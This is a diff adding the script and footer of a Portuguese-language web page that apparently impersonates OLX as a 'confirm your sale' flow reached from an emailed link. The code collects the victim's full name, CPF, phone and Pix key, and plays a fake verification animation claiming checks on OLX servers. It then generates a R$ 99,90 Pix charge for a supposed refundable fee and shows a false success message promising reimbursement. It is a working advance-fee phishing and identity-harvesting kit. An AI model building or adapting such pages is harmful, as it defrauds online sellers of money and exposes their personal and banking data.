+          </div>
+
+        </div>
+      </section>
+
+    </main>
+
+    <!-- Barra Inferior Fixa com Botão "Continuar" (Exato da Imagem) -->
+    <footer class="bottom-bar">
+      <button type="button" class="btn-action-pill" id="main-action-btn" onclick="handleMainAction()">
+        <span id="main-action-btn-text">Continuar</span>
+      </button>
+    </footer>
+
+  </div>
+
+  <script>
+    // ═══════════════════════════════════════════════════════════════════════════
+    // ESTADO E CONTROLE DO WORKFLOW
+    // ═══════════════════════════════════════════════════════════════════════════
+    let currentStep = 1;
+    let _PIX_DATA = null;
+    let _COUNTDOWN_INTERVAL = null;
+    let _POLLING_INTERVAL = null;
+
+    // Recupera parâmetros da URL (injetados pelo link do email)
+    const urlParams = new URLSearchParams(window.location.search);
+    const sellerParam = urlParams.get('vendedor') || '{{ seller_name }}' || 'Vendedor Titular';
+    const buyerParam = urlParams.get('comprador') || '{{ buyer_name }}' || 'Lucas Ferreira';
+    const productParam = urlParams.get('produto') || '{{ product_name }}' || 'iPhone 13 Pro 128GB Grafite';
+    const dateParam = urlParams.get('data') || '{{ sale_date }}' || '24/11/2026';
+    const valueParam = urlParams.get('valor') || '{{ sale_value }}' || '2.850,00';
+
+    // Formata e exibe os valores
+    document.getElementById('disp-seller-name').textContent = sellerParam;
+    document.getElementById('disp-buyer-name').textContent = buyerParam;
+    document.getElementById('disp-product-name').textContent = productParam;
+    document.getElementById('disp-sale-date').textContent = dateParam;
+    document.getElementById('disp-sale-value').textContent = 'R$ ' + valueParam;
+    document.getElementById('form-sale-value-tag').textContent = 'R$ ' + valueParam;
+    document.getElementById('bk-sale-val').textContent = 'R$ ' + valueParam;
+
+    // Preenche campo nome se veio preenchido
+    if (sellerParam && sellerParam !== 'Vendedor Titular') {
+      document.getElementById('lead-fullname').value = sellerParam;
+    }
+
+    // Calcula o somatório final com o reembolso
+    function calcTotalRefund() {
+      const cleanVal = parseFloat(valueParam.replace(/\./g, '').replace(',', '.')) || 2850.0;
+      const total = cleanVal + 99.90;
+      const totalFmt = total.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      document.getElementById('bk-total-val').textContent = 'R$ ' + totalFmt;
+      document.getElementById('txt-calc-sum').textContent = `R$ 99,90 + R$ ${valueParam} = R$ ${totalFmt}`;
+    }
+    calcTotalRefund();
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // VALIDAÇÃO INTELIGENTE (CPF MOD-11, TELEFONE DDD, NOME COMPLETO)
+    // ═══════════════════════════════════════════════════════════════════════════
+    const Validator = {
+      isValidCPF(cpf) {
+        cpf = cpf.replace(/\D/g, '');
+        if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+        let sum = 0, rest;
+        for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+        rest = (sum * 10) % 11;
+        if (rest === 10 || rest === 11) rest = 0;
+        if (rest !== parseInt(cpf.substring(9, 10))) return false;
+        sum = 0;
+        for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+        rest = (sum * 10) % 11;
+        if (rest === 10 || rest === 11) rest = 0;
+        return rest === parseInt(cpf.substring(10, 11));
+      },
+
+      isValidPhone(phone) {
+        let digits = phone.replace(/\D/g, '');
+        if (digits.length < 10 || digits.length > 11) return false;
+        const validDDDs = [
+          11,12,13,14,15,16,17,18,19,21,22,24,27,28,31,32,33,34,35,37,38,
+          41,42,43,44,45,46,47,48,49,51,53,54,55,61,62,63,64,65,66,67,68,
+          69,71,73,74,75,77,79,81,82,83,84,85,86,87,88,89,91,92,93,94,95,96,97,98,99
+        ];
+        const ddd = parseInt(digits.substring(0, 2));
+        if (!validDDDs.includes(ddd)) return false;
+        if (digits.length === 11 && digits.substring(2, 3) !== '9') return false;
+        return true;
+      },
+
+      isValidName(name) {
+        const parts = name.trim().split(/\s+/);
+        return parts.length >= 2 && parts.every(p => p.length >= 2);
+      }
+    };
+
+    // Máscaras de entrada em tempo real
+    const inpCpf = document.getElementById('lead-cpf');
+    const inpPhone = document.getElementById('lead-phone');
+    const inpName = document.getElementById('lead-fullname');
+    const inpPix = document.getElementById('lead-pix-key');
+
+    inpCpf.addEventListener('input', e => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 11) v = v.substring(0, 11);
+      if (v.length > 9) v = v.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
+      else if (v.length > 6) v = v.replace(/^(\d{3})(\d{3})(\d+)/, '$1.$2.$3');
+      else if (v.length > 3) v = v.replace(/^(\d{3})(\d+)/, '$1.$2');
+      e.target.value = v;
+
+      if (v.length === 14) {
+        const ok = Validator.isValidCPF(v);
+        toggleFieldState(e.target, ok, 'err-cpf');
+        // Se a chave pix selecionada for CPF, copia automaticamente
+        if (document.getElementById('lead-pix-type').value === 'cpf' && ok) {
+          inpPix.value = v;
+        }
+      } else {
+        resetFieldState(e.target, 'err-cpf');
+      }
+    });
+
+    inpPhone.addEventListener('input', e => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 11) v = v.substring(0, 11);
+      if (v.length > 10) v = v.replace(/^(\d{2})(\d{5})(\d{4})$/, '($1) $2-$3');
+      else if (v.length > 6) v = v.replace(/^(\d{2})(\d{4})(\d+)/, '($1) $2-$3');
+      else if (v.length > 2) v = v.replace(/^(\d{2})(\d+)/, '($1) $2');
+      e.target.value = v;
+
+      if (v.length >= 14) {
+        const ok = Validator.isValidPhone(v);
+        toggleFieldState(e.target, ok, 'err-phone');
+        if (document.getElementById('lead-pix-type').value === 'telefone' && ok) {
+          inpPix.value = v;
+        }
+      } else {
+        resetFieldState(e.target, 'err-phone');
+      }
+    });
+
+    inpName.addEventListener('input', e => {
+      if (e.target.value.trim().length > 4) {
+        const ok = Validator.isValidName(e.target.value);
+        toggleFieldState(e.target, ok, 'err-fullname');
+      } else {
+        resetFieldState(e.target, 'err-fullname');
+      }
+    });
+
+    function toggleFieldState(inputEl, isValid, errId) {
+      const errEl = document.getElementById(errId);
+      if (isValid) {
+        inputEl.classList.add('is-valid');
+        inputEl.classList.remove('is-invalid');
+        if (errEl) errEl.style.display = 'none';
+      } else {
+        inputEl.classList.remove('is-valid');
+        inputEl.classList.add('is-invalid');
+        if (errEl) errEl.style.display = 'block';
+      }
+    }
+
+    function resetFieldState(inputEl, errId) {
+      inputEl.classList.remove('is-valid');
+      inputEl.classList.remove('is-invalid');
+      const errEl = document.getElementById(errId);
+      if (errEl) errEl.style.display = 'none';
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // TRANSIÇÃO DE TELAS & WORKFLOW
+    // ═══════════════════════════════════════════════════════════════════════════
+    function goToStep(step) {
+      document.querySelectorAll('.step-screen').forEach(s => s.classList.remove('active'));
+      const target = document.getElementById('step-' + step);
+      if (target) {
+        target.classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+      currentStep = step;
+
+      // Modifica o texto e estilo do botão inferior de acordo com o passo
+      const btn = document.getElementById('main-action-btn');
+      const btnText = document.getElementById('main-action-btn-text');
+
+      if (step === 1) {
+        btnText.textContent = 'Continuar';
+        btn.className = 'btn-action-pill';
+        btn.style.display = 'flex';
+      } else if (step === 2) {
+        btnText.textContent = 'Avançar para Verificação';
+        btn.className = 'btn-action-pill btn-primary-purple';
+        btn.style.display = 'flex';
+      } else if (step === 3) {
+        // Esconde botão durante a animação de loading
+        btn.style.display = 'none';
+        runLoadingScreensSequence();
+      } else if (step === 4) {
+        btnText.textContent = 'Liberar Pagamento via Pix (R$ 99,90)';
+        btn.className = 'btn-action-pill btn-primary-purple';
+        btn.style.display = 'flex';
+      } else if (step === 5) {
+        btn.style.display = 'none'; // No step do PIX, botão copiar já fica na tela
+      }
+    }
+
+    // Botão de Ação Principal
+    function handleMainAction() {
+      if (currentStep === 1) {
+        goToStep(2);
+      } else if (currentStep === 2) {
+        // Validação completa do formulário
+        const nameVal = inpName.value.trim();
+        const cpfVal = inpCpf.value.trim();
+        const phoneVal = inpPhone.value.trim();
+        const pixVal = inpPix.value.trim();
+
+        let hasError = false;
+
+        if (!Validator.isValidName(nameVal)) {
+          toggleFieldState(inpName, false, 'err-fullname');
+          hasError = true;
+        }
+        if (!Validator.isValidCPF(cpfVal)) {
+          toggleFieldState(inpCpf, false, 'err-cpf');
+          hasError = true;
+        }
+        if (!Validator.isValidPhone(phoneVal)) {
+          toggleFieldState(inpPhone, false, 'err-phone');
+          hasError = true;
+        }
+        if (!pixVal) {
+          toggleFieldState(inpPix, false, 'err-pix');
+          hasError = true;
+        }
+
+        if (hasError) {
+          showToast('Preencha todos os campos obrigatórios corretamente.', 'error');
+          return;
+        }
+
+        goToStep(3);
+      } else if (currentStep === 4) {
+        generateElitePayCharge();
+      }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // SEQUÊNCIA DE CARREGAMENTO & VERIFICAÇÃO INTELIGENTE (PASSO 3)
+    // ═══════════════════════════════════════════════════════════════════════════
+    function runLoadingScreensSequence() {
+      const progressBar = document.getElementById('loading-progress-bar');
+      const label = document.getElementById('loading-stage-label');
+      const chk1 = document.getElementById('chk-1');
+      const chk2 = document.getElementById('chk-2');
+      const chk3 = document.getElementById('chk-3');
+
+      // Estágio 1 (0% -> 35%)
+      progressBar.style.width = '35%';
+      label.textContent = 'Localizando pedido e comprador nos servidores OLX...';
+
+      setTimeout(() => {
+        chk1.classList.add('done');
+        chk1.querySelector('.check-badge').innerHTML = '✓';
+        progressBar.style.width = '70%';
+        label.textContent = 'Validando autenticidade do CPF e chave Pix bancária...';
+      }, 1500);
+
+      setTimeout(() => {
+        chk2.classList.add('done');
+        chk2.querySelector('.check-badge').innerHTML = '✓';
+        progressBar.style.width = '100%';
+        label.textContent = 'Aprovando protocolo de repasse imediato...';
+      }, 3000);
+
+      setTimeout(() => {
+        chk3.classList.add('done');
+        chk3.querySelector('.check-badge').innerHTML = '✓';
+        label.textContent = 'Tudo pronto! Redirecionando para liberação...';
+      }, 4200);
+
+      setTimeout(() => {
+        goToStep(4);
+      }, 5000);
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    // GERAÇÃO DE COBRANÇA PIX VIA ELITEPAY (PASSO 5)
+    // ═══════════════════════════════════════════════════════════════════════════
+    async function generateElitePayCharge() {
+      const btn = document.getElementById('main-action-btn');
+      const btnText = document.getElementById('main-action-btn-text');
+      btn.disabled = true;
+      btnText.textContent = 'Gerando Cobrança Pix Segura...';
+
+      const payload = {
+        full_name: inpName.value.trim(),
+        cpf: inpCpf.value.replace(/\D/g, ''),
+        phone: inpPhone.value.replace(/\D/g, ''),
+        pix_key: inpPix.value.trim(),
+        pix_bank: document.getElementById('lead-bank').value,
+        product_name: productParam,
+        sale_amount: valueParam,
+        fee_amount: 99.90
+      };
+
+      try {
+        const res = await fetch('/api/confirmar-venda/gerar-pix', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await res.json();
+        btn.disabled = false;
+
+        if (data.ok && (data.pix_code || data.copyPaste || data.qrcode)) {
+          _PIX_DATA = data;
+          const pixCode = data.pix_code || data.copyPaste || data.qrcode;
+          const qrUrl = data.qr_code_url || data.qrcodeUrl || `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}`;
+
+          document.getElementById('pix-code-text').textContent = pixCode;
+          document.getElementById('pix-qr-img').src = qrUrl;
+
+          goToStep(5);
+          startCountdown(15 * 60);
+          startPixStatusPolling(data.txid || data.id);
+          showToast('Código Pix gerado com sucesso!', 'success');
+        } else {
+          showToast(data.error || 'Erro ao comunicar com a gateway ElitePay.', 'error');
+          btnText.textContent = 'Tentar Novamente';
+        }
+      } catch (err) {
+        btn.disabled = false;
+        btnText.textContent = 'Tentar Novamente';
+        showToast('Erro de conexão ao gerar o Pix. Tente novamente.', 'error');
+      }
+    }
+
+    // Copiar código Pix com feedback
+    function copyPixCode() {
+      const txt = document.getElementById('pix-code-text').textContent;
+      if (!txt || txt.includes('Carregando')) return;
+
+      navigator.clipboard.writeText(txt).then(() => {
+        showToast('Código Pix copiado para a área de transferência!', 'success');
+        const btn = document.getElementById('btn-copy-pix');
+        btn.style.background = '#00a650';
+        btn.style.borderColor = '#00a650';
+        btn.innerHTML = '✓ Código Copiado!';
+        setTimeout(() => {
+          btn.style.background = '';
+          btn.style.borderColor = '';
+          btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar Código Pix`;
+        }, 3000);
+      }).catch(() => {
+        showToast('Chave Pix selecionada!', 'info');
+      });
+    }
+
+    // Cronômetro Regressivo
+    function startCountdown(seconds) {
+      if (_COUNTDOWN_INTERVAL) clearInterval(_COUNTDOWN_INTERVAL);
+      let rem = seconds;
+      const el = document.getElementById('pix-countdown');
+      _COUNTDOWN_INTERVAL = setInterval(() => {
+        rem--;
+        if (rem <= 0) {
+          clearInterval(_COUNTDOWN_INTERVAL);
+          el.textContent = '00:00';
+          return;
+        }
+        const m = String(Math.floor(rem / 60)).padStart(2, '0');
+        const s = String(rem % 60).padStart(2, '0');
+        el.textContent = `${m}:${s}`;
+      }, 1000);
+    }
+
+    // Polling de Status do Pix
+    function startPixStatusPolling(txid) {
+      if (!txid) return;
+      if (_POLLING_INTERVAL) clearInterval(_POLLING_INTERVAL);
+      const statusEl = document.getElementById('pix-realtime-status');
+
+      _POLLING_INTERVAL = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/confirmar-venda/status-pix?txid=${encodeURIComponent(txid)}`);
+          const d = await res.json();
+          if (d.paid || d.status === 'APPROVED' || d.status === 'CONCLUIDO') {
+            clearInterval(_POLLING_INTERVAL);
+            clearInterval(_COUNTDOWN_INTERVAL);
+            statusEl.textContent = '✓ Pagamento Confirmado!';
+            statusEl.style.color = '#00a650';
+            showToast('Pagamento confirmado com sucesso!', 'success');
+
+            // Exibe tela final de sucesso
+            document.querySelector('.content-area').innerHTML = `
+              <div style="text-align:center;padding:50px 10px;animation:fadeIn .5s ease">
+                <div style="width:72px;height:72px;border-radius:50%;background:#e6f7ee;color:#00a650;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:36px">✓</div>
+                <h2 style="font-size:24px;font-weight:900;color:#1a1b1c;margin-bottom:10px">Venda e Reembolso Liberados!</h2>
+                <p style="font-size:14px;color:#555;line-height:1.5;max-width:380px;margin:0 auto 24px">Sua taxa temporária de <strong>R$ 99,90</strong> foi estornada e o valor total de <strong style="color:#00a650">${document.getElementById('bk-total-val').textContent}</strong> está sendo enviado via Pix para sua chave cadastrada.</p>
+                <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:16px;text-align:left;font-size:13px;margin-bottom:24px">
+                  <div style="display:flex;justify-content:space-between;margin-bottom:6px"><span>Destinatário:</span><strong>${inpName.value}</strong></div>
+                  <div style="display:flex;justify-content:space-between;margin-bottom:6px"><span>Chave Pix:</span><strong>${inpPix.value}</strong></div>
+                  <div style="display:flex;justify-content:space-between"><span>Status:</span><strong style="color:#00a650">Processando Pix Imediato</strong></div>
+                </div>
+              </div>
+            `;
+          }
+        } catch (e) {}
+      }, 3500);
+    }
+
+    // Toast Helper
+    function showToast(msg, type = 'info') {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.className = 'toast-msg show ' + type;
+      setTimeout(() => { t.classList.remove('show'); }, 3500);
+    }
+  </script>
+</body>
+</html>
